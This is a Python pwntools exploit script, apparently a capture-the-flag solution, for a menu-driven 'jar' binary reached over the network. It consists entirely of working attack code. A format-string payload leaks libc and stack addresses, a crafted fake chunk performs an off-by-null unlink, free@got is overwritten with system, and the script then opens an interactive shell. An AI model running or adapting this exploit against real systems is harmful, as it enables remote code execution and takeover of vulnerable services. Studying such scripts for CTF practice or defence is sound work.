#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 1 leak stack and libc pointers using format string
# 2 use off by null to perform unlink attack to control chunks' pointers array
# 3 overwrite free@got with system
# 4 free chunk with "/bin/sh" as data

from pwn import *

exe = context.binary = ELF('./jar')

host = args.HOST or 'jh2i.com'
port = int(args.PORT or 50030)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug(['/lib64/ld-linux-x86-64.so.2',exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)
def add_jar(data):
    p.sendline("1")
    p.recv(8000)
    p.sendline(data)
    p.recv(8000)

def show_jars():
    p.sendline("3")
    data = p.recvuntil("Main Menu:")[:-len("Main Menu:")]
    p.recv(8000)
    return data

def edit_jar(idx,data):
    p.sendline("4")
    p.recv(8000)
    p.sendline(str(idx))
    p.recv(8000)
    p.sendline(data)
    p.recv(8000)

def delete_jar(idx):
    p.sendline("2")
    p.recv(8000)
    p.sendline(str(idx))
    p.recv(8000)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

p = start()

add_jar("a")
p.recv(8000)
payload = ""
payload += "A"*8
payload += p64(0x0000000000602030)
payload += "A"*(32-len(payload))
payload += "%9$s"
p.sendline(payload)
p.sendline("3")
p.recvline()
data = p.recvline().strip()
p.recv(8000)
leak = u64(data.ljust(8,"\x00"))
print "leak: ",hex(leak)
base = leak - 0x0000000000020750
environ = base + 0x00000000003c6f38
free_hook = base + 0x00000000003c67a8
binsh = base + 0x18ce17
system = base + 0x00000000000453a0
print hex(base)
print hex(environ)
payload = ""
payload += "A"*8
payload += p64(environ)
payload += "A"*(32-len(payload))
payload += "%9$s"
p.sendline(payload)
p.sendline("3")
p.recvline()
data = p.recvline().strip()
p.recv(8000)
stack = u64(data.ljust(8,"\x00"))
print "stack: ",hex(stack)
lel = stack - 0x310
print "aaaa",hex(lel)
free_got = 0x0000000000602018
add_jar("b")
add_jar("c")
add_jar("d")
edit_jar(1,p64(0) + p64(0xf1) + p64(lel - 0x18) + p64(lel - 0x10) + "A"*(0xf9-9-(8*4)) + p64(240))

delete_jar(2)

edit_jar(1,"A"*16+p64(free_got) + p64(lel-0x18) + p64(binsh))
edit_jar(0,p64(system))
p.sendline("2")
p.sendline("2")
p.interactive()
